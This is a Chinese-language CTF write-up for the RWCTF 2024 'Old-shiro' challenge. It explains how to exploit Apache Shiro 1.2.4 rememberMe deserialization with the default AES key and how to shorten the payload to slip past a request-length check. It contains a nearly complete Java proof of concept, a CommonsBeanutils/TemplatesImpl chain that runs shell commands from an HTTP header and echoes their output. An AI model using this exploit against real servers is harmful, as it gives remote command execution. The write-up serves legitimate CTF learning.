---
title: rwctf_Old-shiro题解
date: 2024-01-28 18:53:00 +0800
img_path: /
categories: [CTF, CTF比赛记录]
tags: [CTF, CTF比赛记录]   
---

# Old-shiro题解

## 一、题目分析

访问如下：

![image-20240201172410953](assets/image-20240201172410953.png)

注意到`Remermber me`同时考察的是`Shiro`，果断打✔尝试登录抓包。

![image-20240201172722149](assets/image-20240201172722149.png)

发现关键字为`rememberMe_rwctf_2024`（反编译jar包也可以看到），看一下`pom.xml`依赖。

![image-20240201172941766](assets/image-20240201172941766.png)

`shiro 1.2.4`是存在默认`key`的，验证一下：

![image-20240201173135309](assets/image-20240201173135309.png)

同时注意到有`cb1.9.2`，直接爆破一下利用链吧。

![image-20240201173227902](assets/image-20240201173227902.png)

果然“没”链子，测试发现`400`了，估计是限制长度了(和我出的PolarOA差不多)。

![image-20240201173351584](assets/image-20240201173351584.png)

手打一下，生成个稍微短的`payload`(3300左右)试试。

![image-20240201174227992](assets/image-20240201174227992.png)

还是不行！？



## 二、缩短Payload

题目是不出网的，所以还是得使用回显打，如何缩短`payload`呢？

[Shiro rememberMe 在线解密 (potato.gold)](https://potato.gold/navbar/tool/shiro/ShiroTool.html)这是个`Shiro rememberMe`在线解密的网站，能够帮助我们分析如何缩短我们的`Payload`。

分析了一下`shiro`反序列化综合利用工具的源码: https://github.com/SummerSec/ShiroAttack2/blob/master/src/main/java/com/summersec/attack/deser/echo/SpringEcho.java，这里为什么看这个工具的源码呢？因为我发现这个工具生成的`payload`解密后`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 中 `_bytecodes`的`.class`字节码文件比我正常生成的要短不少。

正常我们去本地编译恶意类需要继承`AbstractTranslet`但是`idea`强制需要我们实现里面的方法否则报错：`类“MyExec”必须声明为抽象，或为实现“AbstractTranslet”中的抽象方法“transform(DOM, DTMAxisIterator, SerializationHandler)”`也就有了下方的内容。

![image-20240201181806062](assets/image-20240201181806062.png)

这样会导致我们生成的恶意字节码长度暴增，因为引入了额外的依赖。

而`shiro`反序列化综合利用工具使用`javassist`生成`class`字节码，我们可以在解密网站下载`class`反编译看看。

![image-20240201182526137](assets/image-20240201182526137.png)

对比发现使用`javassist`生成`class`并没有引入额外的依赖，所以可以更短一些。（为什么呢？有大佬懂么？欢迎指点！）



最终通过删除不必要的字符串和方法逻辑实现了如下`POC`：

```java
package ysoserial.shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

import static ysoserial.payloads.util.Reflections.setFieldValue;


public class POC {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));//shiro默认密钥
        byte[] bytes = byteArrayOutputStream.toByteArray();

        ByteSource ciphertext;
        ciphertext = aes.encrypt(bytes, key);
        System.out.println(ciphertext);
    }
   	public static CtClass genPayloadForLinux() throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
            "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                httpresponse.getWriter().write(new String(result));\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
}
```

生成大概`2700`左右，尝试一下。。。。

![image-20240201175718456](assets/image-20240201175718456.png)

长度校验的是什么呢？把`Request`中的字段删除测试，发现是对整个请求包的长度校验。

删除一部分即可，最后如下：

![image-20240201180532187](assets/image-20240201180532187.png)

![image-20240201180619643](assets/image-20240201180619643.png)

## 三、感悟

前段时间出靶场题目时也遇到了需要回显利用的（`题目上到靶场是不出网的`）且需要确保`rememberMe`不能过长（`为了防止工具能直接梭哈，这样失去了出题的意义`）的问题，出题的时候限制的`rememberMe`长度是不能超过`3500`，因为在解本题之前的时候能生成可利用的`payload`长度最短也有`3400`左右个字符。通过本题，结合之前出题的过程也是顺利的解决了这个问题，未来再出个更短的？`3000`？出个高版本的`shiro`吧，毕竟实战中如何获取`key`也很重要！
